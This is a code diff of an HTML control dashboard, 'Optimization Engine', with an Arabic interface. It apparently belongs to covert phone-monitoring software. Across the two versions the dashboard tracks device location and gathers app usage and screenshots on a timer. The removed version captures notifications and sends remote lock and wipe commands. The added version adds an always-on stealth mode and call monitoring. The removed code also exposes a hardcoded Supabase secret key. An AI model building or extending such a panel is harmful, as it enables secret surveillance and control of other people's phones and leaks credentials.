@@ -3,406 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Optimization Engine - لوحة التحكم</title>
+    <title>Optimization Engine - Fleet Dashboard v3.1</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; background-color: #0f172a; color: #f8fafc; }
-        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
-        #map { height: 400px; border-radius: 12px; }
+        body { font-family: 'Inter', 'Tajawal', sans-serif; background-color: #0c111d; color: #f8fafc; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        .sidebar { width: 300px; background: #111827; border-left: 1px solid #1f2937; display: flex; flex-direction: column; }
+        .main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: radial-gradient(circle at top right, #111827, #0c111d); }
+        .header { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(12px); border-bottom: 1px solid #1f2937; padding: 0 32px; height: 80px; display: flex; align-items: center; justify-content: space-between; }
+        .tab-nav { display: flex; gap: 4px; padding: 8px 32px; background: rgba(17, 24, 39, 0.5); border-bottom: 1px solid #1f2937; }
+        .tab-btn { padding: 10px 20px; border-radius: 12px; cursor: pointer; transition: 0.3s; font-size: 13px; font-weight: 600; color: #94a3b8; border: 1px solid transparent; }
+        .tab-btn:hover { background: #1f2937; color: white; }
+        .tab-btn.active { background: #2563eb; color: white; box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4); }
+        .view-area { flex: 1; overflow-y: auto; padding: 0; position: relative; }
+        .device-item { padding: 16px; margin: 8px 12px; border-radius: 16px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 14px; border: 1px solid transparent; }
+        .device-item:hover { background: #1f2937; border-color: #374151; }
+        .device-item.active { background: #1e3a8a; border-color: #3b82f6; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .status-online { background: #10b981; box-shadow: 0 0 10px #10b981; }
+        #map { height: 100%; width: 100%; min-height: 500px; }
+        .tab-content { display: none; height: 100%; }
+        .tab-content.active { display: block; }
+        .glass { background: rgba(31, 41, 55, 0.4); backdrop-filter: blur(10px); border: 1px solid rgba(75, 85, 99, 0.3); }
         .scroll-hide::-webkit-scrollbar { display: none; }
-        #loginScreen { background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); }
-        .hidden-dashboard { display: none !important; }
+        .animate-fade-in { animation: fadeIn 0.4s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="h-screen flex overflow-hidden">
+<body>
 
-    <!-- Login Screen Overlay -->
-    <div id="loginScreen" class="fixed inset-0 z-[100] flex items-center justify-center p-6">
-        <div class="glass w-full max-w-md p-8 rounded-3xl text-center space-y-6 animate-slide-in">
-            <h1 class="text-3xl font-bold bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">Optimization Engine</h1>
-            <p class="text-slate-400">يرجى تسجيل الدخول للوصول إلى لوحة التحكم</p>
-            
-            <div class="space-y-4 text-right">
-                <div>
-                    <label class="block text-xs font-semibold text-slate-500 uppercase px-2 mb-1">البريد الإلكتروني</label>
-                    <input type="email" id="email" placeholder="admin@example.com" class="w-full bg-slate-800/50 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:border-blue-500 transition-all">
-                </div>
-                <div>
-                    <label class="block text-xs font-semibold text-slate-500 uppercase px-2 mb-1">كلمة المرور</label>
-                    <input type="password" id="password" placeholder="••••••••" class="w-full bg-slate-800/50 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:border-blue-500 transition-all">
-                </div>
-            </div>
-
-            <button onclick="handleLogin()" id="loginBtn" class="w-full py-4 bg-gradient-to-r from-blue-600 to-indigo-600 rounded-xl font-bold hover:shadow-lg hover:shadow-blue-500/20 transition-all flex items-center justify-center gap-2">
-                <span>دخول النظام</span>
-                <i class="fas fa-sign-in-alt"></i>
-            </button>
-            <p id="loginError" class="text-red-400 text-sm hidden"></p>
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="p-8">
+            <h1 class="text-2xl font-black bg-gradient-to-r from-blue-400 to-indigo-400 bg-clip-text text-transparent tracking-tighter">Optimization Engine</h1>
+            <p class="text-[9px] text-slate-500 mt-1 uppercase tracking-[0.2em] font-bold">Fleet Intelligence Dashboard</p>
         </div>
-    </div>
-
-    <!-- Sidebar (Hidden by default) -->
-    <aside id="sidebar" class="w-64 glass flex flex-col border-l border-slate-700 hidden-dashboard">
-        <div class="p-6">
-            <h1 class="text-2xl font-bold bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">Optimization Engine</h1>
-            <p class="text-xs text-slate-400 mt-1">نظام المراقبة والأمان</p>
+        <div class="flex-1 overflow-y-auto scroll-hide mt-4" id="device-list">
+            <div class="px-6 py-2 text-[10px] font-black text-slate-500 uppercase tracking-widest">الأجهزة المتصلة</div>
+            <div class="p-12 text-center text-slate-600 italic text-xs">جاري المزامنة...</div>
         </div>
-        
-        <nav class="flex-1 px-4 mt-4 space-y-2 overflow-y-auto scroll-hide">
-            <div class="text-xs font-semibold text-slate-500 uppercase px-2 mb-2">الأجهزة النشطة</div>
-            <div id="deviceList" class="space-y-1">
-                <!-- Devices will be listed here -->
-                <button class="w-full text-right px-4 py-3 rounded-lg glass border-blue-500 text-blue-400 flex items-center gap-3">
-                    <i class="fas fa-mobile-alt"></i>
-                    <span>جاري التحميل...</span>
-                </button>
-            </div>
-        </nav>
-
-        <div class="p-4 border-t border-slate-700">
-            <div class="flex items-center gap-3">
-                <div class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
-                <span class="text-sm text-slate-400">اتصال مباشر نشط</span>
+        <div class="p-6 border-t border-slate-800/50 bg-slate-900/20">
+            <div class="flex items-center gap-3 opacity-50 grayscale hover:grayscale-0 transition cursor-pointer">
+                <div class="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center text-xs">👤</div>
+                <div class="text-[10px]">
+                    <p class="font-bold">المسؤول الرئيسي</p>
+                    <p>Ghost Admin</p>
+                </div>
             </div>
         </div>
     </aside>
 
     <!-- Main Content -->
-    <main class="flex-1 flex flex-col overflow-hidden">
-        
+    <main class="main-content">
         <!-- Header -->
-        <header id="header" class="h-16 glass flex items-center justify-between px-8 border-b border-slate-700 hidden-dashboard">
-            <div class="flex items-center gap-4">
-                <span id="selectedDeviceName" class="font-semibold text-lg">اختر جهازاً</span>
-                <span id="selectedDeviceId" class="text-xs text-slate-500 font-mono"></span>
+        <header class="header">
+            <div class="flex items-center gap-6">
+                <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-blue-600 to-indigo-700 flex items-center justify-center text-2xl shadow-xl shadow-blue-500/20 text-white">
+                    📱
+                </div>
+                <div>
+                    <h2 id="current-device-name" class="font-bold text-2xl text-white tracking-tight">اختر جهازاً</h2>
+                    <p id="current-device-id" class="text-[10px] text-slate-500 font-mono tracking-widest mt-0.5 italic uppercase">--</p>
+                </div>
             </div>
-            <div class="flex gap-4">
-                <button onclick="refreshData()" class="p-2 hover:bg-slate-700 rounded-full transition-colors"><i class="fas fa-sync-alt"></i></button>
-                <div onclick="handleLogout()" class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center cursor-pointer hover:scale-105 transition-transform title='تسجيل الخروج'">
-                    <i class="fas fa-sign-out-alt"></i>
+
+            <div class="flex items-center gap-8">
+                <div class="text-right">
+                    <p class="text-[9px] font-black text-slate-500 uppercase tracking-widest">حالة الاتصال</p>
+                    <p id="last-seen-header" class="text-sm font-bold text-emerald-400">مباشر الآن</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-[9px] font-black text-slate-500 uppercase tracking-widest">الطاقة</p>
+                    <div class="flex items-center gap-3">
+                        <span id="battery-text" class="text-sm font-bold text-white">--%</span>
+                        <div class="w-10 h-4 bg-slate-800 rounded-sm relative overflow-hidden border border-slate-700">
+                            <div id="battery-bar" class="h-full bg-emerald-500 transition-all duration-500" style="width: 0%"></div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </header>
 
-        <!-- Content Grid -->
-        <div id="contentGrid" class="flex-1 overflow-y-auto p-8 scroll-hide hidden-dashboard">
-            <div class="grid grid-cols-12 gap-6">
+        <!-- Navigation Tabs -->
+        <nav class="tab-nav">
+            <div class="tab-btn active" onclick="switchTab('reports')">📊 التقارير الرئيسية</div>
+            <div class="tab-btn" onclick="switchTab('positions')">📍 تتبع المسار الحي</div>
+            <div class="tab-btn" onclick="switchTab('usage')">⏳ سجل الاستخدام</div>
+            <div class="tab-btn" onclick="switchTab('settings')">⚙️ الإعدادات والهوية</div>
+        </nav>
+
+        <!-- View Area -->
+        <div class="view-area" id="main-view">
+            
+            <!-- Tab: Reports -->
+            <div id="tab-reports" class="tab-content active overflow-y-auto p-8 animate-fade-in">
+                <div class="flex justify-between items-center mb-10">
+                    <h3 class="text-lg font-bold">📸 آخر الالتقاطات والأحداث</h3>
+                    <button onclick="triggerCapture()" id="trigger-capture-btn" class="px-8 py-3 bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-black rounded-2xl shadow-2xl shadow-indigo-500/30 transition-all active:scale-95 flex items-center gap-3">
+                        <span>📸</span> التقاط صورة فورية الآن
+                    </button>
+                </div>
                 
-                <!-- Commands Panel -->
-                <div class="col-span-12 lg:col-span-8 space-y-6">
-                    <div class="glass p-6 rounded-2xl">
-                        <h3 class="text-lg font-semibold mb-4 flex items-center gap-2">
-                            <i class="fas fa-terminal text-blue-400"></i> مركز التحكم عن بعد
-                        </h3>
-                        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
-                            <button onclick="sendCommand('LOCK')" class="p-4 glass hover:bg-red-500/20 hover:border-red-500/50 rounded-xl transition-all group">
-                                <i class="fas fa-lock text-red-400 group-hover:scale-110 transition-transform mb-2 text-xl"></i>
-                                <div class="text-sm font-medium">قفل الجهاز</div>
-                            </button>
-                            <button onclick="sendCommand('ALARM')" class="p-4 glass hover:bg-orange-500/20 hover:border-orange-500/50 rounded-xl transition-all group">
-                                <i class="fas fa-bell text-orange-400 group-hover:scale-110 transition-transform mb-2 text-xl"></i>
-                                <div class="text-sm font-medium">تشغيل إنذار</div>
-                            </button>
-                            <button onclick="sendCommand('CAPTURE')" class="p-4 glass hover:bg-blue-500/20 hover:border-blue-500/50 rounded-xl transition-all group">
-                                <i class="fas fa-camera text-blue-400 group-hover:scale-110 transition-transform mb-2 text-xl"></i>
-                                <div class="text-sm font-medium">لقطة شاشة</div>
-                            </button>
-                            <button onclick="sendCommand('WIPE')" class="p-4 glass hover:bg-slate-500/20 hover:border-slate-500/50 rounded-xl transition-all group border-red-500/20">
-                                <i class="fas fa-trash-alt text-slate-400 group-hover:text-red-400 mb-2 text-xl"></i>
-                                <div class="text-sm font-medium">مسح البيانات</div>
-                            </button>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8" id="reports-grid">
+                    <div class="col-span-full py-32 text-center opacity-30 italic">بانتظار مزامنة البيانات من الجهاز...</div>
+                </div>
+            </div>
+
+            <!-- Tab: Positions -->
+            <div id="tab-positions" class="tab-content relative animate-fade-in">
+                <div id="map"></div>
+                <div class="absolute bottom-8 right-8 z-[1000] glass p-4 rounded-2xl max-w-xs shadow-2xl">
+                    <h4 class="text-xs font-black uppercase text-blue-400 mb-2">تاريخ المسار</h4>
+                    <p class="text-[10px] text-slate-400">يتم رسم الخط الأزرق بناءً على آخر 50 نقطة مسجلة للجهاز المختار.</p>
+                </div>
+            </div>
+
+            <!-- Tab: Usage -->
+            <div id="tab-usage" class="tab-content overflow-y-auto p-12 max-w-5xl mx-auto animate-fade-in">
+                <h3 class="text-2xl font-black mb-10 text-white">🗓️ سجل نشاط التطبيقات</h3>
+                <div id="usage-list" class="space-y-4">
+                    <div class="text-center py-20 opacity-20 italic">لا توجد سجلات بعد.</div>
+                </div>
+            </div>
+
+            <!-- Tab: Settings -->
+            <div id="tab-settings" class="tab-content overflow-y-auto p-12 max-w-3xl mx-auto animate-fade-in">
+                <div class="space-y-12">
+                    <!-- Rename Section -->
+                    <div class="glass p-10 rounded-[2.5rem] space-y-6">
+                        <label class="block text-sm font-black text-slate-400 uppercase tracking-widest">هوية الجهاز (Naming)</label>
+                        <p class="text-xs text-slate-500">قم بوضع اسم مألوف لهذا الجهاز ليظهر في القائمة بدلاً من الكود البرمجي.</p>
+                        <div class="flex gap-4">
+                            <input type="text" id="edit-nickname" placeholder="مثلاً: هاتف محمد" class="flex-1 bg-slate-900 border border-slate-700 rounded-2xl px-6 py-4 text-sm focus:ring-2 ring-blue-500 outline-none transition-all font-bold">
+                            <button onclick="saveNickname()" class="px-10 py-4 bg-blue-600 hover:bg-blue-500 text-white font-black rounded-2xl transition-all shadow-xl shadow-blue-500/20 active:scale-95">حفظ التغييرات</button>
                         </div>
                     </div>
 
-                    <!-- Map -->
-                    <div class="glass p-6 rounded-2xl">
-                        <h3 class="text-lg font-semibold mb-4 flex items-center gap-2">
-                            <i class="fas fa-map-marked-alt text-emerald-400"></i> تتبع الموقع الجغرافي
-                        </h3>
-                        <div id="map"></div>
+                    <!-- Remote Config -->
+                    <div class="glass p-10 rounded-[2.5rem] space-y-8">
+                        <h4 class="font-black text-white text-lg border-b border-slate-700/50 pb-4">⚙️ التحكم عن بُعد</h4>
+                        
+                        <div class="flex justify-between items-center">
+                            <div>
+                                <p class="font-bold text-slate-200">فترة الالتقاط التلقائي</p>
+                                <p class="text-[10px] text-slate-500 tracking-tight">سرعة تحديث صور الشاشة</p>
+                            </div>
+                            <select id="screenshot-interval" class="bg-slate-900 border-slate-800 rounded-xl px-4 py-2 text-sm text-blue-400 font-bold focus:ring-2 ring-blue-500 outline-none">
+                                <option value="10000">كل 10 ثوانٍ (فائق)</option>
+                                <option value="30000">كل 30 ثانية</option>
+                                <option value="60000">كل دقيقة (متوازن)</option>
+                                <option value="300000">كل 5 دقائق (اقتصادي)</option>
+                            </select>
+                        </div>
+
+                        <div class="flex justify-between items-center">
+                            <p class="font-bold text-slate-200">مراقبة المكالمات النشطة</p>
+                            <label class="relative inline-flex items-center cursor-pointer">
+                                <input type="checkbox" id="toggle-calls" class="sr-only peer">
+                                <div class="w-12 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
+                            </label>
+                        </div>
+
+                        <div class="flex justify-between items-center">
+                            <div>
+                                <p class="font-bold text-slate-200">وضع التخفي (Stealth)</p>
+                                <p class="text-[10px] text-emerald-500 font-bold uppercase">نشط حالياً</p>
+                            </div>
+                            <label class="relative inline-flex items-center cursor-pointer">
+                                <input type="checkbox" id="toggle-stealth" checked class="sr-only peer">
+                                <div class="w-12 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-600"></div>
+                            </label>
+                        </div>
+
+                        <button id="save-settings" class="w-full py-5 bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-500 hover:to-indigo-600 text-white font-black rounded-3xl shadow-2xl shadow-blue-500/30 transition-all active:scale-[0.98] mt-4">
+                            تزامن الإعدادات مع الهاتف الآن ✅
+                        </button>
                     </div>
                 </div>
-
-                <!-- Notifications Feed -->
-                <div class="col-span-12 lg:col-span-4 glass p-6 rounded-2xl flex flex-col h-[700px]">
-                    <h3 class="text-lg font-semibold mb-4 flex items-center gap-2">
-                        <i class="fas fa-bell text-yellow-400"></i> سجل الإشعارات الفوري
-                    </h3>
-                    <div id="notificationFeed" class="flex-1 overflow-y-auto space-y-4 pr-2 scroll-hide">
-                        <!-- Notifications will appear here -->
-                        <div class="text-center py-10 text-slate-500">جاري انتظار الإشعارات...</div>
-                    </div>
-                </div>
-
-                <!-- App Usage Summary -->
-                <div class="col-span-12 glass p-6 rounded-2xl">
-                    <h3 class="text-lg font-semibold mb-4 flex items-center gap-2">
-                        <i class="fas fa-chart-pie text-purple-400"></i> إحصائيات استخدام التطبيقات اليومية
-                    </h3>
-                    <div class="overflow-x-auto">
-                        <table class="w-full text-right">
-                            <thead>
-                                <tr class="text-slate-400 text-sm border-b border-slate-700">
-                                    <th class="pb-3 px-4">التطبيق</th>
-                                    <th class="pb-3 px-4">اسم الحزمة</th>
-                                    <th class="pb-3 px-4 text-center">المدة (دقائق)</th>
-                                    <th class="pb-3 px-4 text-left">آخر رصد</th>
-                                </tr>
-                            </thead>
-                            <tbody id="usageTable" class="text-sm">
-                                <!-- Usage logs will appear here -->
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-
-                <!-- Screenshots Gallery -->
-                <div class="col-span-12 glass p-6 rounded-2xl">
-                    <h3 class="text-lg font-semibold mb-4 flex items-center gap-2">
-                        <i class="fas fa-images text-emerald-400"></i> معرض لقطات الشاشة (المراقبة الذكية)
-                    </h3>
-                    <div id="screenshotGallery" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
-                        <!-- Screenshots will appear here -->
-                        <div class="col-span-full text-center py-10 text-slate-500">جاري تحميل الصور...</div>
-                    </div>
-                </div>
-
             </div>
         </div>
     </main>
 
-    <script>
-        // Supabase Configuration
-        const SUPABASE_URL = 'https://kubowqqqawkgghxcktoe.supabase.co';
-        const SUPABASE_KEY = 'sb_secret_wNza7KnqwnZeidrwqpVsQQ_g0a05_YG'; // تم التحديث بالمفتاح السري الجديد
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-
-        // Auth State Handling
-        async function checkSession() {
-            const { data: { session } } = await supabaseClient.auth.getSession();
-            toggleUI(!!session);
-        }
-
-        function toggleUI(isLoggedIn) {
-            document.getElementById('loginScreen').style.display = isLoggedIn ? 'none' : 'flex';
-            const dashElements = document.querySelectorAll('.hidden-dashboard');
-            dashElements.forEach(el => {
-                if (isLoggedIn) el.classList.remove('hidden-dashboard');
-                else el.classList.add('hidden-dashboard');
-            });
-            if (isLoggedIn) {
-                loadDevices();
-                subscribeNotifications();
-            }
-        }
-
-        async function handleLogin() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const btn = document.getElementById('loginBtn');
-            const errorEl = document.getElementById('loginError');
-
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner animate-spin"></i> جاري التحقق...';
-            errorEl.classList.add('hidden');
-
-            const { error } = await supabaseClient.auth.signInWithPassword({ email, password });
-
-            if (error) {
-                errorEl.innerText = "خطأ: " + error.message;
-                errorEl.classList.remove('hidden');
-                btn.disabled = false;
-                btn.innerHTML = '<span>دخول النظام</span> <i class="fas fa-sign-in-alt"></i>';
-            } else {
-                toggleUI(true);
-            }
-        }
-
-        async function handleLogout() {
-            if (confirm('هل تريد تسجيل الخروج؟')) {
-                await supabaseClient.auth.signOut();
-                location.reload();
-            }
-        }
-
-        // Initialize dashboard app
-        checkSession();
-
-        let selectedDeviceId = null;
-        let map, marker;
-
-        // Initialize Map
-        function initMap(lat = 0, lng = 0) {
-            if (map) return;
-            map = L.map('map').setView([lat, lng], 13);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap'
-            }).addTo(map);
-            marker = L.marker([lat, lng]).addTo(map);
-        }
-
-        async function loadDevices() {
-            // سنفترض وجود أجهزة عبر جلب أول سجلات من الإشعارات أو المواقع
-            const { data, error } = await supabaseClient.from('locations').select('device_id').limit(10);
-            if (data) {
-                const uniqueDevices = [...new Set(data.map(d => d.device_id))];
-                const list = document.getElementById('deviceList');
-                list.innerHTML = '';
-                uniqueDevices.forEach(id => {
-                    const btn = document.createElement('button');
-                    btn.className = `w-full text-right px-4 py-3 rounded-lg glass flex items-center gap-3 transition-all ${id === selectedDeviceId ? 'border-blue-500 text-blue-400' : 'hover:bg-slate-700'}`;
-                    btn.onclick = () => selectDevice(id);
-                    btn.innerHTML = `<i class="fas fa-mobile-alt"></i><span>جهاز ${id.substring(0, 6)}</span>`;
-                    list.appendChild(btn);
-                });
-                if (!selectedDeviceId && uniqueDevices.length > 0) selectDevice(uniqueDevices[0]);
-            }
-        }
-
-        function selectDevice(id) {
-            selectedDeviceId = id;
-            document.getElementById('selectedDeviceId').textContent = id;
-            document.getElementById('selectedDeviceName').textContent = `جهاز ${id.substring(0, 6)}`;
-            refreshData();
-            loadDevices(); // Update UI selection
-        }
-
-        async function sendCommand(cmd) {
-            if (!selectedDeviceId) return alert('الرجاء اختيار جهاز أولاً');
-            const { error } = await supabaseClient.from('commands').insert([
-                { device_id: selectedDeviceId, command: cmd }
-            ]);
-            if (error) alert('فشل إرسال الأمر');
-            else alert(`تم إرسال أمر ${cmd} بنجاح`);
-        }
-
-        // Live Notifications
-        function subscribeNotifications() {
-            supabaseClient
-                .channel('public:notification_logs')
-                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'notification_logs' }, payload => {
-                    if (payload.new.device_id === selectedDeviceId) {
-                        addNotificationToFeed(payload.new);
-                    }
-                })
-                .subscribe();
-        }
-
-        function addNotificationToFeed(notif) {
-            const feed = document.getElementById('notificationFeed');
-            const div = document.createElement('div');
-            div.className = 'glass p-4 rounded-xl border-r-4 border-blue-500 animate-slide-in';
-            div.innerHTML = `
-                <div class="flex justify-between items-start mb-1">
-                    <span class="text-xs font-bold text-blue-400">${notif.app_name}</span>
-                    <span class="text-[10px] text-slate-500">${new Date(notif.created_at).toLocaleTimeString('ar-SA')}</span>
-                </div>
-                <div class="text-sm font-semibold mb-1">${notif.title}</div>
-                <div class="text-xs text-slate-400">${notif.content}</div>
-            `;
-            feed.prepend(div);
-        }
-
-        // Fetch Data
-        async function refreshData() {
-            if (!selectedDeviceId) return;
-
-            // Fetch Notifications
-            const { data: notifs } = await supabaseClient.from('notification_logs')
-                .select('*')
-                .eq('device_id', selectedDeviceId)
-                .order('created_at', { ascending: false })
-                .limit(20);
-            
-            const feed = document.getElementById('notificationFeed');
-            feed.innerHTML = '';
-            if (notifs) notifs.forEach(n => addNotificationToFeed(n));
-
-            // Fetch Location
-            const { data: locs } = await supabaseClient.from('locations')
-                .select('*')
-                .eq('device_id', selectedDeviceId)
-                .order('created_at', { ascending: false })
-                .limit(1);
-            
-            if (locs && locs.length > 0) {
-                const l = locs[0];
-                initMap(l.latitude, l.longitude);
-                map.setView([l.latitude, l.longitude]);
-                marker.setLatLng([l.latitude, l.longitude]);
-            } else {
-                initMap(0, 0);
-            }
-
-            // Fetch App Usage
-            const { data: usage } = await supabaseClient.from('app_usage')
-                .select('*')
-                .eq('device_id', selectedDeviceId)
-                .order('captured_at', { ascending: false })
-                .limit(10);
-            
-            const table = document.getElementById('usageTable');
-            table.innerHTML = '';
-            if (usage) {
-                usage.forEach(u => {
-                    const row = `
-                        <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
-                            <td class="py-3 px-4 font-semibold">${u.app_name}</td>
-                            <td class="py-3 px-4 text-slate-500 text-xs">${u.package_name}</td>
-                            <td class="py-3 px-4 text-center">
-                                <span class="bg-blue-500/20 text-blue-400 px-2 py-1 rounded-full text-xs font-bold">${u.duration_minutes}</span>
-                            </td>
-                            <td class="py-3 px-4 text-left text-slate-400 text-xs">${u.captured_at}</td>
-                        </tr>
-                    `;
-                    table.innerHTML += row;
-                });
-            }
-
-            // Fetch Screenshots
-            const { data: files } = await supabaseClient.storage
-                .from('monitoring_data')
-                .list(`screenshots/${selectedDeviceId}`, {
-                    limit: 12,
-                    offset: 0,
-                    sortBy: { column: 'name', order: 'desc' }
-                });
-            
-            const gallery = document.getElementById('screenshotGallery');
-            gallery.innerHTML = '';
-            if (files && files.length > 0) {
-                files.forEach(file => {
-                    const { data: url } = supabaseClient.storage
-                        .from('monitoring_data')
-                        .getPublicUrl(`screenshots/${selectedDeviceId}/${file.name}`);
-                    
-                    const div = document.createElement('div');
-                    div.className = 'aspect-video rounded-lg overflow-hidden glass border-slate-700 hover:border-blue-500 transition-all cursor-pointer';
-                    div.onclick = () => window.open(url.publicUrl, '_blank');
-                    div.innerHTML = `<img src="${url.publicUrl}" class="w-full h-full object-cover" loading="lazy">`;
-                    gallery.appendChild(div);
-                });
-            } else {
-                gallery.innerHTML = '<div class="col-span-full text-center py-10 text-slate-500">لا توجد صور متاحة بعد لهذا الجهاز</div>';
-            }
-        }
-
-        // Initial Load
-        loadDevices();
-        subscribeNotifications();
-    </script>
-
-    <style>
-        @keyframes slide-in {
-            from { transform: translateX(20px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        .animate-slide-in { animation: slide-in 0.3s ease-out forwards; }
-    </style>
+    <!-- Logic Script -->
+    <script src="fleet_logic.js?v=3.6"></script>
 </body>
 </html>
